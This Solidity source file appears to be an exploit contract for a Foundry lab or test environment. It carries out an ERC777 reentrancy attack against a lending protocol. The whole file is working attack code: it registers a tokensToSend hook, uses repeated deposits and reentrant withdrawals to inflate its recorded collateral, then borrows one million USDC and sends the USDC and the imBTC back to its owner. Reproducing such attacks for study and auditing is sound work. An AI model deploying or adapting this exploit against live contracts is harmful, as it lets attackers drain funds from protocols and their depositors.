// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";

interface ILend {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function borrow(uint256 amount) external;
    function deposits(address account) external returns (uint256);
}

contract AttackChainLend {
    address owner;
    ILend lend;
    IERC20 imBTC;
    IERC20 usdc;

    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    uint256 private constant ONE_IMBTC = 1 * 1e8;
    uint256 private constant ONE_MILLION_USDC = 1_000_000 * 1e6;

    uint16 private reentranceCalls;

    constructor(address _imBTC, address _usdc, address _lend) {
        lend = ILend(_lend);
        imBTC = IERC20(_imBTC);
        usdc = IERC20(_usdc);
        owner = msg.sender;

        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    function exploit() external {
        require(msg.sender == owner, "Not Owner");

        imBTC.approve(address(lend), type(uint256).max);
        // 1 imBTC --> $20000
        // 80 % $20000 --> $16000
        // 80 % $1.25m --> $1m
        // $20000 * 62.5 --> $1.25m
        for (uint8 i = 0; i <= 63; i++) {
            lend.deposit(ONE_IMBTC);
            lend.deposit(0);
        }

        imBTC.approve(address(lend), 0);

        lend.borrow(ONE_MILLION_USDC);
        usdc.transfer(owner, ONE_MILLION_USDC);
        imBTC.transfer(owner, ONE_IMBTC);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        require(msg.sender == address(imBTC), "Not imBTC");

        reentranceCalls += 1;
        if (reentranceCalls % 2 == 0) {
            lend.withdraw(ONE_IMBTC);
        }
    }
}
